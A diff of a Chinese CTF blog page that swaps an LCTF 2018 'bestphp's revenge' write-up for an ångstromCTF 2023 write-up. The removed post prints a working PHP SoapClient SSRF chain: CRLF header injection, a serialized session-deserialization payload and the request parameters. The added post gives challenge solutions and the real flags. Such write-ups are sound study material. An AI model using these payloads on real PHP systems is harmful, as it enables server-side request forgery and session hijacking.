@@ -2,9 +2,9 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>bestphp&#39;s revenge | 甜筒园</title>
-  <meta name="keywords" content=" ssrf漏洞 , session反序列化 , CRLF Injection ">
-  <meta name="description" content="bestphp&#39;s revenge | 甜筒园">
+  <title>ångstromCTF 2023 | 甜筒园</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="ångstromCTF 2023 | 甜筒园">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="catch me if you canF12拿到flag actf&amp;#123;y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874&amp;#125;  Celeste Speedrunning Association看题目意思好像要时间破个记录，访问&#x2F;play路由有个按钮，点了后告诉我没有破记录，用">
 <meta property="og:type" content="article">
@@ -524,9 +524,9 @@
 </aside>
 <div id="post">
     <div class="pjax">
-        <article id="post-bestphps-revenge" class="article article-type-post" itemscope itemprop="blogPost">
+        <article id="post-angstromCTF-2023" class="article article-type-post" itemscope itemprop="blogPost">
     
-        <h1 class="article-title">bestphp&#39;s revenge</h1>
+        <h1 class="article-title">ångstromCTF 2023</h1>
     
     <div class="article-meta">
         
@@ -541,26 +541,15 @@
         </span>
         
         
-        <span class="tag">
-            <i class="iconfont icon-tag"></i>
-            
-            <a class="color2">ssrf漏洞</a>
-            
-            <a class="color2">session反序列化</a>
-            
-            <a class="color5">CRLF Injection</a>
-            
-        </span>
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2023-05-09 20:30:28'>2023-04-25 15:17</time>
         
     </div>
     <div class="article-meta">
         
-            Created At : <time class="date" title='Updated At: 2023-03-21 16:10:19'>2023-03-14 19:17</time>
-        
-    </div>
-    <div class="article-meta">
-        
-        <span>Count:1.5k</span>
+        <span>Count:587</span>
         
         
         <span id="busuanzi_container_page_pv">
@@ -590,7 +579,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-php%E5%86%85%E7%BD%AE%E7%B1%BBSoapClient"><span class="toc-text">1.php内置类SoapClient</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CRLF-Injection%E6%BC%8F%E6%B4%9E"><span class="toc-text">2. CRLF Injection漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-call-user-func"><span class="toc-text">3.call_user_func</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-PHPsession-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-text">4.PHPsession 反序列化</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#catch-me-if-you-can"><span class="toc-text">catch me if you can</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Celeste-Speedrunning-Association"><span class="toc-text">Celeste Speedrunning Association</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shortcircuit"><span class="toc-text">shortcircuit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#directory"><span class="toc-text">directory</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Celeste-Tunneling-Association"><span class="toc-text">Celeste Tunneling Association</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -606,133 +595,117 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>题目源码:</p>
-<pre><code class="php">&lt;?php
-highlight_file(__FILE__);
-$b = &#39;implode&#39;;
-call_user_func($_GET[&#39;f&#39;], $_POST);
-session_start();
-if (isset($_GET[&#39;name&#39;])) &#123;
-  $_SESSION[&#39;name&#39;] = $_GET[&#39;name&#39;];
+        <h2 id="catch-me-if-you-can"><a href="#catch-me-if-you-can" class="headerlink" title="catch me if you can"></a>catch me if you can</h2><p>F12拿到flag</p>
+<pre><code class="flag">actf&#123;y0u_caught_m3!_0101ff9abc2a724814dfd1c85c766afc7fbd88d2cdf747d8d9ddbf12d68ff874&#125;
+</code></pre>
+<h2 id="Celeste-Speedrunning-Association"><a href="#Celeste-Speedrunning-Association" class="headerlink" title="Celeste Speedrunning Association"></a>Celeste Speedrunning Association</h2><p>看题目意思好像要时间破个记录，访问<code>/play</code>路由有个按钮，点了后告诉我没有破记录，用hackbar看一眼有个POST参数start,猜测是通过当前时间减去这个start的时间值来算记录时间的，那就把start的值改大一点，让时间是负的就可以拿到flag</p>
+<pre><code class="flag">actf&#123;wait_until_farewell_speedrun&#125;
+</code></pre>
+<h2 id="shortcircuit"><a href="#shortcircuit" class="headerlink" title="shortcircuit"></a>shortcircuit</h2><p>随便传入账号密码不对，hackbar也没显示传参，F12查看源码发现一段js</p>
+<pre><code class="js">const swap = (x) =&gt; &#123;
+    let t = x[0]
+    x[0] = x[3]
+    x[3] = t
+
+    t = x[2]
+    x[2] = x[1]
+    x[1] = t
+
+    t = x[1]
+    x[1] = x[3]
+    x[3] = t
+
+    t = x[3]
+    x[3] = x[2]
+    x[2] = t
+
+    return x
 &#125;
-var_dump($_SESSION);
-$a = array(reset($_SESSION), &#39;welcome_to_the_lctf2018&#39;);
-call_user_func($b, $a);
 
-//flag.php(扫目录扫的)
-only localhost can get flag!session_start();
-echo &#39;only localhost can get flag!&#39;;
-$flag = &#39;LCTF&#123;*************************&#125;&#39;;
-if($_SERVER[&quot;REMOTE_ADDR&quot;]===&quot;127.0.0.1&quot;)&#123;
-       $_SESSION[&#39;flag&#39;] = $flag;
-   &#125;
-only localhost can get flag!
-</code></pre>
-<p>先来学习一些知识点：</p>
-<hr>
-<h3 id="1-php内置类SoapClient"><a href="#1-php内置类SoapClient" class="headerlink" title="1.php内置类SoapClient"></a>1.php内置类SoapClient</h3><p>​         SOAP是webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。其采用HTTP作为底层通讯协议，XML作为数据传送的格式。<br>SoapClient类可以创建soap数据报文，与wsdl接口进行交互。</p>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/1999159-20210127114912726-2133757689.jpg"></p>
-<p>​         第一个参数的意思是：控制是否是wsdl模式，如果为NULL，就是非wsdl模式.如果是非wsdl模式，反序列化的时候就会对options中的url进行远程soap请求，第二个参数的意思是：一个数组，里面是soap请求的一些参数和属性。</p>
-<p><strong>简单的用法</strong></p>
-<pre><code class="php">&lt;?php
-$a = new SoapClient(null,array(location&#39;=&gt;&#39;http://127.0.0.1/flag.php&#39;,&#39;uri&#39;=&#39;http://127.0.0.1/&#39;));
-$b = serialize($a);
-echo $b;
-$c = unserialize($b);
-$c-&gt;a();
-</code></pre>
-<p>​        可以利用 <strong>SoapClient</strong> 类的 <strong>__call</strong> （当调用对象中不存在的方法会自动调用此方法）方法来进行 <strong>SSRF</strong></p>
-<h3 id="2-CRLF-Injection漏洞"><a href="#2-CRLF-Injection漏洞" class="headerlink" title="2. CRLF Injection漏洞"></a>2. CRLF Injection漏洞</h3><p>​        <strong>CRLF是”回车+换行”（\r\n）的简称。在HTTP协议中，HTTPHeader与HTTPBody是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以，一旦我们能够控制HTTP消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLFInjection又叫HTTPResponseSplitting，简称HRS。</strong><br><strong>简单来说</strong><br><strong>http请求遇到两个\r\n即%0d%0a，会将前半部分当做头部解析，而将剩下的部分当做体，当我们可以控制User-Agent的值时，头部可控，就可以注入crlf实现修改http请求包。</strong></p>
-<pre><code class="php">&lt;?php
-$target = &quot;http://127.0.0.1/flag.php&quot;;
-$options = array(
-    &quot;location&quot; =&gt; $target,
-    &quot;user_agent&quot; =&gt; &quot;ttycp3\r\nCookie: PHPSESSID=114514\r\n&quot;,
-    &quot;uri&quot; =&gt; &quot;demo&quot;
-);
-$attack = new SoapClient(null,$options);
-$payload = serialize($attack);
-unserialize($payload)-&gt;ff(); // 调用一个不存在的ff方法，会触发__call方法，发出HTTP请求
-?&gt;
-</code></pre>
-<h3 id="3-call-user-func"><a href="#3-call-user-func" class="headerlink" title="3.call_user_func"></a>3.call_user_func</h3><p><strong>call_user_func函数中的参数可以是一个数组，数组中第一个元素为类名，第二个元素为类方法。</strong></p>
-<p>先传入<code>extract()</code>，将<code>$b</code>覆盖成回调函数，这样题目中的 <code>call_user_func($b,$a)</code> 就可以变成 <code>call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’))</code> ，即调用 <strong>SoapClient</strong> 类不存在的 <strong>welcome_to_the_lctf2018</strong> 方法，从而触发 <strong>__call</strong> 方法发起 <strong>soap</strong> 请求进行 <strong>SSRF</strong> 。</p>
-<h3 id="4-PHPsession-反序列化"><a href="#4-PHPsession-反序列化" class="headerlink" title="4.PHPsession 反序列化"></a>4.PHPsession 反序列化</h3><pre><code>session.save_handler  session保存形式。默认为files
+const chunk = (x, n) =&gt; &#123;
+    let ret = []
 
-session.save_path    session保存路径
+    for(let i = 0; i &lt; x.length; i+=n)&#123;
+        ret.push(x.substring(i,i+n))
+    &#125;
 
-session.serialize_handler  session序列化存储所用处理器。默认为php
-</code></pre>
-<p>session中有三种序列化处理器处理session的情况</p>
-<pre><code class="php">&lt;?php 
+    return ret
+&#125;
 
-session_start();
+const check = (e) =&gt; &#123;
+    if (document.forms[0].username.value === &quot;admin&quot;) &#123;
+        if (swap(chunk(document.forms[0].password.value, 30)).join(&quot;&quot;) == &quot;7e08250c4aaa9ed206fd7c9e398e2&#125;actf&#123;cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7&quot;) &#123;
+            location.href = &quot;/win.html&quot;
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>根据题意是把密码每30个字符分为一组，然后通过swap函数交换四段字符位置，输出结果为<code>7e08250c4aaa9ed206fd7c9e398e2&#125;actf&#123;cl1ent_s1de_sucks_544e67ef12024523398ee02fe7517fffa92516317199e454f4d2bdb04d9e419ccc7</code>,先把四段字符分开看</p>
+<pre><code>7e08250c4aaa9ed206fd7c9e398e2&#125;
+actf&#123;cl1ent_s1de_sucks_544e67e
+f12024523398ee02fe7517fffa9251
+6317199e454f4d2bdb04d9e419ccc7
+</code></pre>
+<p>按照swap函数的定义，这段字符原本的顺序是4132，所以正确的密码是</p>
+<pre><code class="flag">actf&#123;cl1ent_s1de_sucks_544e67e6317199e454f4d2bdb04d9e419ccc7f12024523398ee02fe7517fffa92517e08250c4aaa9ed206fd7c9e398e2&#125;
+</code></pre>
+<p>即flag</p>
+<h2 id="directory"><a href="#directory" class="headerlink" title="directory"></a>directory</h2><p>纯爆破，在burpsuite中用Intruder模块爆破，在<code>3054.html</code>找到flag</p>
+<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230425164437077.png" alt="image-20230425164437077"></p>
+<pre><code>actf&#123;y0u_f0und_me_b51d0cde76739fa3&#125;
+</code></pre>
+<h2 id="Celeste-Tunneling-Association"><a href="#Celeste-Tunneling-Association" class="headerlink" title="Celeste Tunneling Association"></a>Celeste Tunneling Association</h2><p>查看源码：</p>
+<pre><code class="python"># run via `uvicorn app:app --port 6000`
+import os
 
-$_SESSION[&#39;name&#39;]=&#39;ttycp3&#39;;
-</code></pre>
-<pre><code class="php">php_binary 键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
-    
-php 键名+竖线（|）+经过serialize()函数处理过的值
-    
-php_serialize 经过serialize()函数处理过的值，会将键名和值当作一个数组序列化
-    
-    
-例如：    
-当 session.serialize_handler=php 时，session文件内容为： name|s:6:&quot;ttycp3&quot;;  
+SECRET_SITE = b&quot;flag.local&quot;
+FLAG = os.environ[&#39;FLAG&#39;]
 
-当 session.serialize_handler=php_serialize 时，session文件为： a:1:&#123;s:4:&quot;name&quot;;s:6:&quot;ttycp3&quot;;&#125;
+async def app(scope, receive, send):
+    assert scope[&#39;type&#39;] == &#39;http&#39;
 
-当 session.serialize_handler=php_binary 时，session文件内容为： 二进制字符names:6:&quot;ttycp3&quot;;
-</code></pre>
-<p>使用不同引擎就会发生漏洞，通常是先使用php_serialize进行序列化，然后php默认引擎进行反序列化，这是因为<strong>php引擎反序列化时，|被当做分隔符</strong></p>
-<p>例如</p>
-<p>php_serialize引擎  a:1:{s:4:”name”;s:9:”|username”;}</p>
-<p>php  就会反序列化username ，前面是键名，后面是键值</p>
-<p>所以我们只需要传入$_SESSION[‘name’] &#x3D; |序列化内容</p>
-<hr>
-<p>接下来分析题目:</p>
-<p>​          flag.php 文件中告诉我们，只有 127.0.0.1 请求该页面才能得到 flag ，所以这明显又是考察 SSRF 漏洞，这里我们便可以利用 SoapClient 类的 __call 方法来进行 SSRF</p>
-<p>第一步：由于 PHP 中的原生 SoapClient 类存在 CRLF 漏洞，所以我们可以伪造任意 header ，构造 <strong>SoapClient</strong> 类，并用php_serialize引擎进行序列化，存入session</p>
-<p>​        这里还用到一个知识点：<strong>PHP 7 中 session_start () 函数可以接收一个数组作为参数，可以覆盖 php.ini 中 session 的配置项。</strong></p>
-<p> 脚本构造：</p>
-<pre><code class="php">&lt;?php
-$target=&#39;http://127.0.0.1/flag.php&#39;;
-$b = new SoapClient(null,array(&#39;location&#39; =&gt; $target,
-    &#39;user_agent&#39; =&gt; &quot;ttycp3\r\nCookie:PHPSESSID=123456\r\n&quot;,
-    &#39;uri&#39; =&gt; &quot;http://127.0.0.1/&quot;));
+    headers = scope[&#39;headers&#39;]
 
-$se = serialize($b);
-echo &quot;|&quot;.urlencode($se);
+    await send(&#123;
+        &#39;type&#39;: &#39;http.response.start&#39;,
+        &#39;status&#39;: 200,
+        &#39;headers&#39;: [
+            [b&#39;content-type&#39;, b&#39;text/plain&#39;],
+        ],
+    &#125;)
 
-//注意下，这个脚本想要执行，需要将php.ini里的extension=soap前面的分号去掉
-</code></pre>
-<p> 执行后得到</p>
-<pre><code>|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
-</code></pre>
-<p>传参：</p>
-<pre><code class="html">GET:
-f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A33%3A%22ttycp3%0D%0ACookie%3APHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
+    # IDK malformed requests or something
+    num_hosts = 0
+    for name, value in headers:
+        if name == b&quot;host&quot;:
+            num_hosts += 1
 
-POST:
-serialize_handler=php_serialize
+    if num_hosts == 1:
+        for name, value in headers:
+            if name == b&quot;host&quot; and value == SECRET_SITE:
+                await send(&#123;
+                    &#39;type&#39;: &#39;http.response.body&#39;,
+                    &#39;body&#39;: FLAG.encode(),
+                &#125;)
+                return
+
+    await send(&#123;
+        &#39;type&#39;: &#39;http.response.body&#39;,
+        &#39;body&#39;: b&#39;Welcome to the _tunnel_. Watch your step!!&#39;,
+    &#125;)
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314193907764.png" alt="image-20230314193907764"></p>
-<p>第二步：通过变量覆盖，调用SoapClient类，从而触发__call 方法</p>
-<p>传值f&#x3D;extract&amp;name&#x3D;SoapClient POST:b&#x3D;call_user_func. 这样 call_user_func($b,$a)就变成call_user_func(‘call_user_func’,array(‘SoapClient’,’welcome_to_the_lctf2018’)) ，即调用 SoapClient 类不存在的 welcome_to_the_lctf2018 方法，从而触发 __call 方法发起 soap 请求进行 SSRF 。</p>
-<p>传参：</p>
-<pre><code>GET:
-f=extract&amp;name=SoapClient
-POST:
-b=call_user_func
+<p>可知，要求请求中host值为<code>flag.local</code>获得flag，hackbar发包不成功，用python写个脚本发包获取flag：</p>
+<pre><code class="python">import requests
+
+headers = &#123;
+    &quot;Host&quot;: &quot;flag.local&quot;
+&#125;
+
+response = requests.get(&quot;https://pioneer.tailec718.ts.net/&quot;, headers=headers)
+print(response.text)
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194523209.png" alt="image-20230314194523209"></p>
-<p>第三步：将PHPSESSID改为我们在SoapClient类里设置的123456即可得到flag</p>
-<p>传参：</p>
-<pre><code>Cookie:PHPSESSID=123456
+<pre><code class="flag">actf&#123;reaching_the_core__chapter_8&#125;
 </code></pre>
-<p><img src="https://ttycp3.oss-cn-beijing.aliyuncs.com/img/image-20230314194729913.png" alt="image-20230314194729913"></p>
-<p><strong>参考</strong></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/NPFS/p/14335370.html">bestphp’s revenge[详解]</a></p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至1004454362@qq.com </span>
